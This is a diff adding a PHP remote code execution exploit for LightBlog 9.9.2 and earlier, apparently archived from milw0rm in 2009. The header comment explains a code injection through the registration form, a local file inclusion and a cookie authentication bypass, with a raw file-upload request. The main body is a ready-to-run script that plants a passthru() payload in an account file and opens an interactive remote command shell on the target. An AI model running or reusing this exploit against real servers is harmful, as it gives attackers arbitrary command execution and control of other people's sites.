@@ -1,0 +1,158 @@
+<?
+
+/*
+	---------------------------------------------------------------
+	LightBlog <= 9.9.2 (register.php) Remote Code Execution Exploit
+	---------------------------------------------------------------
+	
+	author...: EgiX
+	mail.....: n0b0d13s[at]gmail[dot]com
+	
+	link.....: http://www.publicwarehouse.co.uk/
+	demo.....: http://www.bailey-projects.com/projects/1/lightblog/
+
+	This PoC was written for educational purpose. Use it at your own risk.
+	Author will be not responsible for any damage.
+
+	[-] vulnerable code in /register.php
+
+	58.	    $username_towrite = stripslashes(htmlspecialchars($_POST['username_post'], ENT_QUOTES));
+	59.	    $password_towrite = stripslashes(md5(htmlspecialchars($_POST['pwd1_post'], ENT_QUOTES)));
+	60.	    $name_towrite = stripslashes(htmlspecialchars($_POST['name_post'], ENT_QUOTES));
+	61.	    $email_towrite = stripslashes(htmlspecialchars($_POST['email_post'], ENT_QUOTES));
+	62.	
+	63.	    $newaccountfile = "./accounts/{$username_towrite}.php";
+	64.	                         
+	65.	    $details = "<?php
+	66.	                \$password = \"{$password_towrite}\";
+	67.	                \$name = \"{$name_towrite}\";
+	68.	                \$email = \"{$email_towrite}\";
+	69.	                \$type = \"member\";
+	70.	                \$location = \"\";
+	71.	                \$aboutme = \"\";
+	72.	                \$website = \"\";
+	73.	                ?>";
+	74.	
+	75.	    $fd = fopen ($newaccountfile, "w");
+	76.	    chmod($newaccountfile, 0777);
+	77.	    fwrite ($fd, $details);
+	78.	    fclose($fd);
+
+	An attacker could be able to inject and execute arbitrary PHP code due to new accounts are saved
+	with "php" extension. This is possible because input is not properly sanitised, so you can use
+	"complex curly syntax", which allows to put complex expressions into string definitions.
+
+	[-] vulnerable code in /check_user.php
+
+	6.	if(isset($_COOKIE['Lightblog_username']) and isset($_COOKIE['Lightblog_password'])){
+	7.	
+	8.	    $username_cookie = $_COOKIE['Lightblog_username'];
+	9.	    $password_cookie = $_COOKIE['Lightblog_password'];
+	10.	
+	11.	    if(file_exists("./accounts/{$username_cookie}.php")){
+	12.	
+	13.	        include("./accounts/{$username_cookie}.php");
+	14.	
+	15.	        if($password_cookie != $password){
+	16.	            
+	17.	            setcookie("Lightblog_password", "", time()-9999999);
+	18.	            setcookie("Lightblog_username", "", time()-9999999);
+	19.	            echo "<script>location.replace('login.php')</script>";
+	20.	            exit; 
+	21.	
+	22.	        } else { 
+	23.	            $username = $username_cookie;
+	24.	            $user = true; 
+	25.	        }
+
+	In addition to the LFI (line 13), an attacker could be able to bypass the authentication by
+	setting special crafted cookies. So anyone can access to cp_*.php and is able to to upload
+	arbitrary file or put malicious php code into e.g. settings.php. Arbitrary file upload poc:
+
+	POST /lightblog/cp_preview.php HTTP/1.0
+	Host: localhost
+	Cookie: Lightblog_password=; Lightblog_username=../header
+	Content-Length: 166
+	Content-Type: multipart/form-data; boundary=o0oOo0o
+	Connection: close
+
+	--o0oOo0o
+	Content-Disposition: form-data; name="image"; filename="poc.php"
+
+	<?php evil_code(); ?>
+	--o0oOo0o--
+
+
+	[-] Disclosure timeline:
+		
+	[21/04/2009] - Bug discovered
+	[22/04/2009] - Vendor contacted but no response
+	[25/04/2009] - Vendor contacted again still no response
+	[26/04/2009] - Vendor has deleted any reference to LighBlog on his site (???)
+	[27/04/2009] - Public disclosure
+
+*/
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("default_socket_timeout", 5);
+
+function http_send($host, $packet)
+{
+	if (($s = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) == false)
+	  die("\nsocket_create(): " . socket_strerror($s) . "\n");
+
+	if (socket_connect($s, $host, 80) == false)
+	  die("\nsocket_connect(): " . socket_strerror(socket_last_error()) . "\n");
+
+	socket_write($s, $packet, strlen($packet));
+	while ($m = socket_read($s, 2048)) $response .= $m;
+
+	socket_close($s);
+	return $response;
+}
+
+print "\n+-------------------------------------------------------------------------+";
+print "\n| LightBlog <= 9.9.2 (register.php) Remote Code Execution Exploit by EgiX |";
+print "\n+-------------------------------------------------------------------------+\n";
+
+if ($argc < 3)
+{
+	print "\nUsage......: php $argv[0] host path\n";
+	print "\nExample....: php $argv[0] localhost /";
+	print "\nExample....: php $argv[0] localhost /lightblog/\n\n";
+	die();
+}
+
+$host = $argv[1];
+$path = $argv[2];
+
+$code = rawurlencode('{${error_reporting(0)}}{${print(_code_)}}{${passthru(base64_decode($_SERVER[HTTP_CMD]))}}{${die}}');
+
+$payload = "username_post=test&pwd1_post=test&pwd2_post=test&name_post=test&email_post={$code}";
+$packet  = "POST {$path}register.php HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Content-Length: ".strlen($payload)."\r\n";
+$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$packet .= "Connection: close\r\n\r\n";
+$packet .= $payload;
+
+http_send($host, $packet);
+
+$packet  = "GET {$path} HTTP/1.0\r\n";
+$packet .= "Host: {$host}\r\n";
+$packet .= "Cookie: Lightblog_password=; Lightblog_username=test\r\n";
+$packet .= "Cmd: %s\r\n";
+$packet .= "Connection: close\r\n\r\n";
+
+while(1)
+{
+	print "\nlightblog-shell# ";
+	if (($cmd = trim(fgets(STDIN))) == "exit") break;
+	$response = http_send($host, sprintf($packet, base64_encode($cmd)));
+	preg_match("/_code_/", $response) ? print array_pop(explode("_code_", $response)) : die("\n[-] Exploit failed\n");
+}
+
+?>
+
+# milw0rm.com [2009-04-27]
